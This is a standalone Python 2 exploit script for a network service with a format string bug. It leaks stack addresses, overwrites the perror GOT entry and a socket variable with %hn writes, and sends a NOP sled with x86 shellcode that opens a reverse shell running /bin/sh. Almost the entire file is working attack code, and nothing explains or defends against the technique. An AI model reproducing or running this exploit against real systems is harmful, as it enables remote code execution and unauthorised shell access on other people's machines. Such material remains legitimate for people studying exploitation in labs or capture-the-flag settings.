#!/usr/bin/python

from socket import *
import struct
import sys

# read from binary file
def read_values_from_binfile (filename):
    # fill values array
    values = []
    with open (filename, 'rb') as fpr:
        content = fpr.read()
        span = 4
        values = [ struct.unpack ('<I', content[i:i+span])[0] for i in range(0, len(content), span) ]

    return values

# leak stack through format string
def leak_addresses (host, port, start = 1, end = 746):
    values = []
    for idx in range (start, end):
        csock = socket (AF_INET, SOCK_STREAM)
        csock.connect ( (host, port) )
        fmt = '%{0}$x'.format (idx)
        csock.send (fmt)
        raw = csock.recv(8)
        # search c string
        value = ''
        for c in raw:
            if c == '\x00':
                break
            value += c
        values.append ( int (value, 16) )
        csock.close ()
    return values

def filter_addr (addr_list, base_addr):
    filtered = []
    for value in values:
        if value & 0xff000000 == base_addr:
            filtered.append (value)
    return filtered

if len (sys.argv) == 2:
    (progname, filename) = sys.argv
elif len (sys.argv) == 4:
    (progname, host, port, lport) = sys.argv
    port = int (port, 10)
    lport = int (lport, 10)
    lport = struct.pack ('>H', lport)
    print 'lport: {0}'.format (lport)
else:
    print 'Usage (2 args): {0} dump_name'.format (sys.argv[0])
    print 'Usage (3 args): {0} host port lport'.format (sys.argv[0])
    exit (1)

print '[+] Leaking part of stack'
if 'filename' in locals():
    values = read_values_from_binfile (filename)
    leaked_addr = values[523]
elif 'host' in locals() and 'port' in locals():
    values = leak_addresses ( host, port, 522, 525 )
    leaked_addr = values[2]
else:
    print 'Failed execution'
    exit (1)

# filter out only stack address
stack_addr_list = filter_addr (values, 0xbf000000)
libs = filter_addr (values, 0xb7000000)
'''
dirty hack to get stack address
better: align values to array of offsets and determine correct stack address
'''
print '[+] Got leaked address'

# compute buffer addresses
print '[+] Computing addresses'
esp = leaked_addr - 0x898
ebp = esp + 0x838
input_buf = ebp - 0x420
output_buf = ebp - 0x820
landing = input_buf + 100
print '    esp    : 0x{0:x}'.format (esp)
print '    ebp    : 0x{0:x}'.format (ebp)
print '    input  : 0x{0:x}'.format (input_buf)
print '    output : 0x{0:x}'.format (output_buf)
print '    landing: 0x{0:x}'.format (landing)

# addresses
perror_got = 0x804a010
ssock_addr = 0x804a064

# format elements
padding = 'A'
stackpop = '%u%u%u'
pairs = '{0}{0}{1}{1}'.format ( struct.pack ("<I", perror_got + 2), struct.pack ("<I", perror_got) )
# length calculation for correct address generation
print '[+] Calculating lengths'
landing1 = ((landing & 0xffff0000) >> 16)
len1 = landing1 - len (padding + stackpop + pairs) + 3 # 3 for '%hn'
len2 = (landing & 0xffff) - landing1

# construct format strings
print '[+] Building perror_got patch format string'
fmt_write_got = padding + stackpop + pairs + '%{0}u%hn'.format (len1) + '%{0}u%hn'.format (len2)
print '    {0}'.format (fmt_write_got)

# reverse shell to port 11111
print '[+] Building ssock patch format string'
payload = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
payload += "\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd"
payload += "\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01"
payload += "\x01\x66\x68" + lport + "\x66\x6a\x02\x89\xe1"
payload += "\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b"
payload += "\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
payload += "\x6e\x89\xe3\x31\xc9\xcd\x80"
print '[+] payload = {0}'.format (payload.encode ('hex'))
fmt_write_ssock = padding + stackpop + struct.pack ("<I", ssock_addr) * 2 + '%10u%hn'
# too much nopsled cause the payload to be cutted off, need to calculate better
# nopsled = (1023 - len (fmt_write_ssock)) * '\x90'
nopsled = 100 * '\x90'
fmt_write_ssock += nopsled + payload
print '    {0}'.format (fmt_write_ssock)

# format string write
# payload + format will patch ssock to cause accept to fail, exit and go to our shellcode
if len (sys.argv) == 4:
    print '[+] Patching exit.got function pointer'
    csock = socket (AF_INET, SOCK_STREAM)
    csock.connect ( (host, port) )
    csock.send ( fmt_write_got )
    csock.close ()

    print '[+] Triggering payload!!!'
    csock = socket (AF_INET, SOCK_STREAM)
    csock.connect ( (host, port) )
    csock.send ( fmt_write_ssock )
    csock.close ()

    print '[+] You should have gotten a reverse shell, if not, the exploit failed'

print 'Bye'

